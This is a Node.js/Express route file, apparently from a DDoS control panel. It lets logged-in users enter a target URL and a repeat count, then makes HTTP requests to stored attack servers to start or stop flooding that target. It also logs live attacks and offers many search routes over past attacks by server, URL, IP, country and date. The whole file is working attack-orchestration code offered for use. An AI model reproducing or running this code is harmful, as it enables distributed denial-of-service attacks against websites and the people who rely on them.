module.exports = (app, functions, isLoggedIn) => {
    const dbServer = require('../../models/serverSchema.js')
    const dbAttack = require('../../models/attackInfoSchema')
    const dbLiveAttack = require('../../models/attackLiveSchema')

    // -----[Attack]-----
    app.get('/attack', isLoggedIn, async (req, res) => {
        const servers = await dbServer.find()
        res.render('ddos/servers/attack', { servers: servers });
    });

    app.post('/attack', isLoggedIn, async (req, res) => {
        let serverAttackList = [];
        let promises = [];

        const server = await dbServer.find();
        const element = new dbLiveAttack({
            url: `${req.body.Url}.${req.body.Dom}`,
            times: req.body.Times,
            timesRealized: 0,
            time: "",
            hourStart: new Date()
        })

        await element.save();

        if (typeof req.body.name === "object") {
            for (let i = 0; i < server.length; i++) {
                for (let a = 0; a < req.body.name.length; a++) {
                    if (req.body.name[a] == server[i]._id) {
                        let promise = fetch(`http://${server[i].Url}/attackurl/${req.body.Url}/${req.body.Dom}/${req.body.Times}/${server[i]._id}`)
                            .catch(() => {
                                console.log("[Server] The server is offline: " + server.Url);
                            })
                            .then(() => {
                                serverAttackList.push(server[i].id);
                                console.log("push-> " + server[i].id);
                            });
        
                        promises.push(promise);
                    }
                }
            }
        } else if (typeof req.body.name === "string") {
            for (let i = 0; i < server.length; i++) {
                if (server[i]._id == req.body.name) {
                    let promise = fetch(`http://${server[i].Url}/attackurl/${req.body.Url}/${req.body.Dom}/${req.body.Times}/${server[i]._id}`)
                        .catch(() => {
                            console.log("[Server] The server is offline: " + server.Url);
                        })
                        .then(() => {
                            serverAttackList.push(server[i].id);
                            console.log("push-> " + server[i].id);
                        });
        
                    promises.push(promise);
                }
            }
        }
        
        // Esperar a que todas las promesas se resuelvan antes de continuar
        Promise.all(promises)
            .then(async () => {
                console.log("Final serverAttackList: ", serverAttackList);

                for (let i = 0; i < serverAttackList.length; i++) {
                    await dbLiveAttack.findOneAndUpdate({ _id: element.id }, {
                        $push: {
                            'servers': {
                                serverID: serverAttackList[i]
                            }
                        }
                    })
                }                

                const element2 = await dbLiveAttack.findById(element.id);
                console.log(element2)
            })
            .catch((error) => {
                console.error("Error while processing promises: ", error);
            });

        res.redirect('/ddos');
    });

    app.post('/attack/:id', isLoggedIn, async (req, res) => {
        const server = await dbServer.findById(req.params.id)
        const url = `http://${server.Url}/attackurl/${req.body.Url}/${req.body.Dom}/${req.body.Times}/${req.params.id}`

        fetch(url)
            .then(res.redirect('/servers/server/' + req.params.id))
            .catch(() => {
                console.log("[Server] The server is offline: " + server.Url);
            });
    });

    app.get('/attack/:id/stop/:url/:dom/:times', isLoggedIn, async (req, res) => {
        const server = await dbServer.findById(req.params.id)
        fetch(`http://${server.Url}/stop/${req.params.url}/${req.params.dom}/${req.params.times}/${req.params.id}`)
            .then(res.send("[Server] Se ha mandado la peticion para pararlo"))
            .catch(() => {
                console.log("[Server] The server is offline: " + server.Url);
            });
    }); 
    
    // -----[Find Attacks]-----

    // Find one attack
    app.get('/attacks/findoneattack/search', isLoggedIn, async (req, res) => {
        res.render('ddos/attacks/search', {
            title: 'Find an Attack',
            id: true,
            action: '/attacks/findoneattack/search'
        });
    });

    app.post('/attacks/findoneattack/search', isLoggedIn, async (req, res) => {
        res.redirect('/attacks/attack/' + req.body.id);
    });

    // Find all attacks for a specific server
    app.get('/attacks/findAllAttacksForThisServer/search', isLoggedIn, async (req, res) => {
        res.render('ddos/attacks/search', {
            title: 'Find all Attacks for this server:',
            id: true,
            action: '/attacks/findAllAttacksForThisServer/search'
        });
    });

    app.post('/attacks/findAllAttacksForThisServer/search', isLoggedIn, async (req, res) => {
        res.redirect('/servers/server/' + req.body.id);
    });

    // Find all attacks for an url
    app.get('/attacks/findAllAttacksForThisUrl/search', isLoggedIn, async (req, res) => {
        res.render('ddos/attacks/search', {
            title: 'Find all Attacks on this url:',
            url: true,
            action: '/attacks/findAllAttacksForThisUrl/search'
        });
    });

    app.post('/attacks/findAllAttacksForThisUrl/search', isLoggedIn, async (req, res) => {
        const data = await functions.findAllAttacksForThisUrl(req.body.url)
        res.render('ddos/attacks/allAttacks', { data: data.reverse(), title: 'All Attacks for ' + req.body.url, totalAttacks: data.length });
    });

    // Find all attacks for a server to an url
    app.get('/attacks/findAllAttacksForThisServerOnThisUrl/search', isLoggedIn, async (req, res) => {
        res.render('ddos/attacks/search', {
            title: 'Find all Attacks for this server on this url:',
            id: true,
            url: true,
            action: '/attacks/findAllAttacksForThisServerOnThisUrl/search'
        });
    });

    app.post('/attacks/findAllAttacksForThisServerOnThisUrl/search', isLoggedIn, async (req, res) => {
        const data = await functions.findAllAttacksForThisServerOnThisUrl(req.body.id, req.body.url)
        res.render('ddos/attacks/allAttacks', { data: data.reverse(), title: 'All Attacks for ' + req.body.url, totalAttacks: data.length });
    });

    // Find all attacks for this publicip
    app.get('/attacks/findAllAttacksForThisPublicIp/search', isLoggedIn, async (req, res) => {
        res.render('ddos/attacks/search', {
            title: 'Find all Attacks for this public ip:',
            publicip: true,
            action: '/attacks/findAllAttacksForThisPublicIp/search'
        });
    });

    app.post('/attacks/findAllAttacksForThisPublicIp/search', isLoggedIn, async (req, res) => {
        const data = await functions.findAllAttacksForThisPublicIp(req.body.publicip)
        res.render('ddos/attacks/allAttacks', { data: data.reverse(), title: 'All Attacks for ' + req.body.publicip, totalAttacks: data.length });
    });

    // Find all attacks for this privateip
    app.get('/attacks/findAllAttacksForThisPrivateIp/search', isLoggedIn, async (req, res) => {
        res.render('ddos/attacks/search', {
            title: 'Find all Attacks for this private ip:',
            privateip: true,
            action: '/attacks/findAllAttacksForThisPrivateIp/search'
        });
    });

    app.post('/attacks/findAllAttacksForThisPrivateIp/search', isLoggedIn, async (req, res) => {
        const data = await functions.findAllAttacksForThisPrivateIp(req.body.privateip)
        res.render('ddos/attacks/allAttacks', { data: data.reverse(), title: 'All Attacks for ' + req.body.privateip, totalAttacks: data.length });
    });

    // Find all attacks for this country
    app.get('/attacks/findAllAttacksForThisCountry/search', isLoggedIn, async (req, res) => {
        res.render('ddos/attacks/search', {
            title: 'Find all Attacks for this country:',
            country: true,
            action: '/attacks/findAllAttacksForThisCountry/search'
        });
    });

    app.post('/attacks/findAllAttacksForThisCountry/search', isLoggedIn, async (req, res) => {
        const data = await functions.findAllAttacksForThisCountry(req.body.country)
        res.render('ddos/attacks/allAttacks', { data: data.reverse(), title: 'All Attacks for this country: ' + req.body.country, totalAttacks: data.length });
    });

    // Find all attacks for this country to this url
    app.get('/attacks/findAllAttacksForThisCountryOnThisUrl/search', isLoggedIn, async (req, res) => {
        res.render('ddos/attacks/search', {
            title: 'Find all Attacks for this country:',
            url: true,
            country: true,
            action: '/attacks/findAllAttacksForThisCountryOnThisUrl/search'
        });
    });

    app.post('/attacks/findAllAttacksForThisCountryOnThisUrl/search', isLoggedIn, async (req, res) => {
        const data = await functions.findAllAttacksForThisCountryOnThisUrl(req.body.country, req.body.url)
        res.render('ddos/attacks/allAttacks', { data: data.reverse(), title: 'All Attacks for this country: ' + req.body.country, totalAttacks: data.length });
    });

    // Find all attacks for one day
    app.get('/attacks/findAllAttacksOfThisDate/search', isLoggedIn, async (req, res) => {
        res.render('ddos/attacks/search', {
            title: 'Find all Attacks for this day:',
            date: true,
            action: '/attacks/findAllAttacksOfThisDate/search'
        });
    });

    app.post('/attacks/findAllAttacksOfThisDate/search', isLoggedIn, async (req, res) => {
        let { date } = req.body
        if (!date || typeof date !== 'string' || !/^(\d{4})-(\d{2})-(\d{2})$/.test(date)) {
            console.error("Invalid date format or missing date.");
            return [];
        }

        const data = await dbAttack.find();

        const [year, month, day] = date.split('-');

        const formattedMonth = month.replace(/^0/, '');
        const formattedDay = day.replace(/^0/, '');

        const targetDate = `${formattedDay}/${formattedMonth}/${year}`;

        const arr2 = data.filter(item => {
            const a = item.hourStart.split(' ')[2].split('[')[1].split(']')[0];
            return a === targetDate;
        });

        res.render('ddos/attacks/allAttacks', { data: arr2.reverse(), title: req.body.date, totalAttacks: arr2.length });
    });

    // Find all attacks for one month
    app.get('/attacks/findAllAttacksOfThisMonth/search', isLoggedIn, async (req, res) => {
        res.render('ddos/attacks/search', {
            title: 'Find all Attacks for this month:',
            date: true,
            action: '/attacks/findAllAttacksOfThisMonth/search'
        });
    });

    app.post('/attacks/findAllAttacksOfThisMonth/search', isLoggedIn, async (req, res) => {
        const { date } = req.body;
        let dateSplitted = date.split('-');

        let year = dateSplitted[0];
        let month = dateSplitted[1].replace(/^0/, '');
        let month2
        const months = ["January", "February", "March",
            "April", "May", "June", "July", "August", "September", "October", "November",
            "December"];
        if (month >= 1 && month <= 12) {
            month2 = months[month - 1];
        }

        let arr = await functions.findAllAttacksOfThisMonth(`${month}/${year}`)
        res.render('ddos/attacks/allAttacks', { data: arr.reverse(), title: month2, totalAttacks: arr.length });
    });

    // Find all attacks for one year
    app.get('/attacks/findAllAttacksOfThisYear/search', isLoggedIn, async (req, res) => {
        res.render('ddos/attacks/search', {
            title: 'Find all Attacks for this year:',
            date: true,
            action: '/attacks/findAllAttacksOfThisYear/search'
        });
    });

    app.post('/attacks/findAllAttacksOfThisYear/search', isLoggedIn, async (req, res) => {
        const { date } = req.body;
        let dateSplitted = date.split('-');

        let year = dateSplitted[0];

        let arr = await functions.findAllAttacksOfThisYear(year)
        res.render('ddos/attacks/allAttacks', { data: arr.reverse(), title: year, totalAttacks: arr.length });
    });

    // Find all attacks
    app.get('/attacks/all', isLoggedIn, async (req, res) => {
        const data = await dbAttack.find();
        res.render('ddos/attacks/allAttacks', { data: data.reverse(), totalAttacks: data.length, title: 'All Attacks' });
    });

    app.get('/attacks/attack/:id', isLoggedIn, async (req, res) => {
        const data = await functions.findOneAttack(req.params.id)
        res.render('ddos/attacks/oneAttack', { data: data });
    });

    app.get('/attacks/attack/:id/delete', isLoggedIn, async (req, res) => {
        const data = await functions.findOneAttack(req.params.id)
        await dbAttack.findByIdAndDelete(req.params.id)
        res.redirect('/servers/server/' + data.serverID);
    });

    // Advanced Search 
    app.get('/attackFind/selectCountry', isLoggedIn, async (req, res) => {
        const servers = await dbServer.find();
        const countris = [];

        for (let i = 0; i < servers.length; i++) {
            if (!countris.includes(servers[i].Location)) {
                countris.push(servers[i].Location);
            }
        }

        res.render('ddos/servers/selectCountry', { countris: countris });
    });

    app.post('/attackFind/selectCountry', isLoggedIn, async (req, res) => {
        res.redirect('/attackFind/country/' + req.body.selectCountry)
    });

    app.get('/attackFind/country/:country', isLoggedIn, async (req, res) => {
        const servers = await dbServer.find({ Location: req.params.country })
        res.render('ddos/servers/attack', { servers: servers });
    })
}